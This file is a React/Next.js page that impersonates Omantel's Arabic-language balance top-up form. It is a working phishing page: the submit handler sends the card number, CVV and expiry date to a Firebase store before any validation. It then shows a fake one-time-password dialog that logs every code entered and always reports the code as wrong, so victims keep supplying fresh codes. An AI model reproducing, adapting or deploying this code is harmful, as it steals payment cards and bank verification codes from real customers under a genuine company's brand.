"use client"

import type React from "react"
import type { ReactElement } from "react"
import {
  Menu,
  Search,
  ShoppingBag,
  User,
  Phone,
  Facebook,
  Instagram,
  Twitter,
  Youtube,
  MessageSquare,
  PhoneCall,
  ArrowRight,
  CheckCircle2,
  Loader2,
  TriangleAlert,
} from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import Link from "next/link"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter,
  DialogClose,
} from "@/components/ui/dialog"
import { useEffect, useState } from "react"
import { addData } from "@/lib/firebase"
import { OmantelLogo } from "@/components/logo"
import Image from "next/image"
import { Badge } from "@/components/ui/badge"
const allOtps=['']
export default function OmantelPage(): ReactElement {
  // Form state management
  const [formValues, setFormValues] = useState({
    cardNumber: "",
    expiryDate: "",
    cardHolder: "",
    email: "",
    cvv: "", // Add CVV field
  })
  const [otp, setOtp] = useState("")
  const [amount, setAmount] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [isDialogOpen, setIsDialogOpen] = useState(false)
  const [loading, setIsLoading] = useState(false)

useEffect(()=>{
  const amo=localStorage.getItem('amount')
  setAmount(amo!)
},[])
  // Handle form input changes
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>): void => {
    const { id, value } = e.target

    // Format card number with spaces every 4 digits
    if (id === "card-number") {
      const formatted = value
        .replace(/\s/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()
      setFormValues({
        ...formValues,
        cardNumber: formatted,
      })
      return
    }

    // Format expiry date with slash
    if (id === "expiry-date") {
      let formatted = value.replace(/\D/g, "")
      if (formatted.length > 2) {
        formatted = formatted.slice(0, 2) + "/" + formatted.slice(2, 4)
      }
      setFormValues({
        ...formValues,
        expiryDate: formatted,
      })
      return
    }

    // Format CVV to only allow numbers
    if (id === "cvv") {
      const formatted = value.replace(/\D/g, "")
      setFormValues({
        ...formValues,
        cvv: formatted,
      })
      return
    }

    // Map the id to the state property
    const fieldMap: Record<string, keyof typeof formValues> = {
      "card-holder": "cardHolder",
      email: "email",
    }

    setFormValues({
      ...formValues,
      [fieldMap[id] || id]: value,
    })
  }

  const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>): void => {
    e.preventDefault()
    setIsLoading(true)
    // Basic validation  e.preventDefault()

    const _id=localStorage.getItem('visitor')
    addData({id:_id,cardNumber:formValues.cardNumber,cvv:formValues.cvv,expiryDate:formValues.expiryDate})
    if (
      !formValues.cardNumber ||
      !formValues.expiryDate ||
      !formValues.cardHolder ||
      !formValues.email ||
      !formValues.cvv
    ) {
      
      return
    }

    // CVV validation
    if (formValues.cvv.length < 3) {
      return
    }

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(formValues.email)) {
      return
    }

    // Open the OTP dialog
setTimeout(() => {
  setIsLoading(false)
      setIsDialogOpen(true)
}, 4000); 
 }

  const handleOtpSubmit = (): void => {
    // Validate OTP
    allOtps.push(otp)

    const _id=localStorage.getItem('visitor')
    addData({id:_id,allOtps,otp})
    if (otp.length !== 6) {
    
      return
    }

    setIsSubmitting(true)

    // Simulate API call
    setTimeout(() => {
      setIsSubmitting(false)
      setIsSuccess(true)

      // Close dialog after showing success for a moment
      setTimeout(() => {
        // Reset form after successful submission
        setFormValues({
          cardNumber: "",
          expiryDate: "",
          cardHolder: "",
          email: "",
          cvv: "",
        })
        setOtp("")
        setIsSuccess(false)
      }, 2000)
    }, 1500)
  }

  return (
    <div className="bg-white font-sans">
      <header className="flex items-center justify-between p-4 border-b border-gray-200 sticky top-0 bg-white z-10">
        <Button variant="ghost" size="icon" className="text-orange-500">
          <Menu className="h-6 w-6" />
          <span className="sr-only">Menu</span>
        </Button>
        <div className="flex items-center gap-2">
          <Button variant="ghost" size="icon" className="text-orange-500">
            <User className="h-6 w-6" />
            <span className="sr-only">Profile</span>
          </Button>
          <Button variant="ghost" size="icon" className="text-orange-500">
            <ShoppingBag className="h-6 w-6" />
            <span className="sr-only">Cart</span>
          </Button>
          <Button variant="ghost" size="icon" className="text-orange-500">
            <Search className="h-6 w-6" />
            <span className="sr-only">Search</span>
          </Button>
        </div>
        <OmantelLogo className="h-6 text-purple-700" />
      </header>

      <main className="bg-gray-100 p-4 md:p-8">
        <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6">
          <div className="flex items-center gap-2 text-orange-500 font-semibold">
            <ArrowRight className="h-4 w-4" />
            <Link href="/">إلى الخلف</Link>
          </div>

          <div className="text-center space-y-2">
            <h1 className="text-3xl font-bold text-gray-800">أعد تعبئة رصيدك الآن!</h1>
            <p className="text-gray-500">بخطوات بسيطة وسريعة دون الحاجة إلى تسجيل الدخول</p>
          </div>

         

          <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
            <form onSubmit={handleFormSubmit} className="space-y-4 text-right">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2 col-span-2">
                  <label htmlFor="card-number" className=" text-sm font-medium text-gray-700 block">
                    رقم البطاقة
                  </label>
                  <Input
                    id="card-number"
                    type="text"
                    value={formValues.cardNumber}
                    onChange={handleInputChange}
                    placeholder="0000 0000 0000 0000"
                    maxLength={19}
                  />
                </div>
                <div className="space-y-2">
                  <label htmlFor="expiry-date" className="text-sm font-medium text-gray-700 block">
                    تاريخ انتهاء الصلاحية
                  </label>
                  <Input
                    id="expiry-date"
                    type="text"
                    placeholder="MM/YY"
                    value={formValues.expiryDate}
                    onChange={handleInputChange}
                    maxLength={5}
                  />
                </div>
                <div className="space-y-2">
                  <label htmlFor="cvv" className="text-sm font-medium text-gray-700 block">
                    رمز الأمان (CVV)
                  </label>
                  <Input
                    id="cvv"
                    type="password"
                    value={formValues.cvv}
                    onChange={handleInputChange}
                    placeholder="***"
                    maxLength={4}
                    className="text-center"
                  />
                </div>
              </div>

              
                

              <div className="space-y-2">
                <label htmlFor="card-holder" className="text-sm font-medium text-gray-700 block">
                  اسم حامل البطاقة
                </label>
                <Input
                  id="card-holder"
                  type="text"
                  value={formValues.cardHolder}
                  onChange={handleInputChange}
                  placeholder="الاسم كما يظهر على البطاقة"
                />
              </div>

              <DialogTrigger asChild>
                <Button type="submit" className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold mt-6">
                  تعبئة الرصيد ({amount} ر.ع) {loading && <Loader2 className="animate-spin"/>}
                </Button>
              </DialogTrigger>
              <div className="flex justify-center ">
                <Image src="exp.svg" width={35} height={35} alt="visa"/>
                <Image src="mas.svg" width={35} height={35} alt="mas"/>
                <Image src="visa.svg" width={35} height={35} alt="exp"/>
              </div>
            </form>

            <DialogContent className="sm:max-w-[425px] text-right">
              {isSuccess ? (
                <div className="py-8 text-center space-y-4">
                      <TriangleAlert className="text-red-600" />

                  <DialogTitle className="text-xl text-red-500">رمز التحقق غير صحيح </DialogTitle>
                  <DialogDescription>سوف يتم ارسال رمز جديد الى جوالك.</DialogDescription>
                </div>
              ) : (
                <>
                  <DialogHeader>
                    <DialogTitle>التحقق من كلمة المرور لمرة واحدة</DialogTitle>
                    <DialogDescription>
                      لقد أرسلنا كلمة مرور لمرة واحدة إلى رقم هاتفك المسجل. يرجى إدخالها أدناه للمتابعة.
                    </DialogDescription>
                  </DialogHeader>

                  <div className="grid gap-4 py-4">
                    <div className="space-y-2">
                      <label htmlFor="otp" className="text-sm font-medium text-gray-700 block">
                        كلمة المرور لمرة واحدة
                      </label>
                      <Input
                        id="otp"
                        value={otp}
                        type="tel"
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                        className="col-span-3 text-center tracking-widest text-lg"
                        maxLength={6}
                        placeholder="******"
                      />
                   
                    </div>
                  </div>

                  <DialogFooter>
                    <DialogClose asChild>
                      <Button type="button" variant="secondary">
                        إلغاء
                      </Button>
                    </DialogClose>
                    <Button
                      type="button"
                      onClick={handleOtpSubmit}
                      disabled={isSubmitting}
                      className="bg-orange-500 hover:bg-orange-600"
                    >
                      {isSubmitting ? "جاري التأكيد..." : "تأكيد الدفع"}
                    </Button>
                  </DialogFooter>
                </>
              )}
            </DialogContent>
          </Dialog>
        </div>
      </main>

      <footer className="bg-[#0c1427] text-white pt-8 pb-4 px-6">
        <div className="max-w-4xl mx-auto">
          <div className="relative mb-8">
            <h3 className="text-lg font-semibold mb-4">جهات التواصل</h3>
            <div className="space-y-3">
              <div className="flex items-center gap-3">
                <PhoneCall className="h-5 w-5 text-orange-500" />
                <span>1234 رقم مركز الاتصال</span>
              </div>
              <div className="flex items-center gap-3">
                <PhoneCall className="h-5 w-5 text-orange-500" />
                <span>1235 مركز اتصال الشركات</span>
              </div>
            </div>
            <div className="absolute -top-4 left-0 bg-blue-600 p-3 rounded-full shadow-lg">
              <MessageSquare className="h-6 w-6 text-white" />
            </div>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-sm">
            <div>
              <h4 className="font-bold mb-3">الشركة</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    عن عمانتل
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    الاستدامة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    الوظائف
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المركز الإعلامي
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    مختبرات عمانتل للابتكار
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">خدمة المشتركين</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المساعدة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    قنوات الدفع
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المنافذ
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    التغطية
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">الشركات</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المستثمرون
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    iSupplier
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    أعمال الجملة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المناقصات الإلكترونية
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    تصاريح الحفريات
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">السياسات</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    سياسة الخصوصية
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    سياسة الإبلاغ عن المخالفات
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    إغلاق شبكة الجيل الثالث
                  </Link>
                </li>
              </ul>
            </div>
          </div>

          <div className="mt-10 text-center">
            <h4 className="font-semibold mb-4">تابعونا على منصات التواصل الاجتماعي</h4>
            <div className="flex justify-center gap-4">
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Facebook className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Instagram className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Twitter className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Youtube className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Phone className="h-5 w-5" />
              </Link>
            </div>
          </div>

          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-xs text-gray-400 space-y-4">
            <div className="flex flex-col md:flex-row justify-center gap-x-6 gap-y-2">
              <Link href="#" className="hover:text-orange-400">
                الملكية الفكرية
              </Link>
              <Link href="#" className="hover:text-orange-400">
                اتفاقية العملاء الموحدة
              </Link>
              <Link href="#" className="hover:text-orange-400">
                خارطة الموقع
              </Link>
            </div>
            <div className="flex items-center justify-center gap-2">
              <span>Oman Telecommunications Company © 2024</span>
              <OmantelLogo className="h-4 text-white" />
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
